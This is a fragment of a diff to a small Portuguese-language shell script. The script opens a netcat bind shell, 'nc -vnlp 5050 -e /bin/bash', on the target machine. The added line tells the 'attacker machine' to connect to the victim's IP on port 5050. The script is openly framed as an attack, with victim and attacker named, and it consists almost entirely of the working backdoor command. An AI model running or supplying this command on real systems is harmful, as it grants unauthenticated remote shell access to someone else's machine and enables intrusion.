@@ -7,3 +7,4 @@ echo "Abrindo a Conexão..."
 sleep 3
 nc -vnlp 5050 -e /bin/bash
 echo "Pronto só conectar com a outra maquina"
+echo "Na maquina atacante digita nc -vn (ip da vitima 5050)"
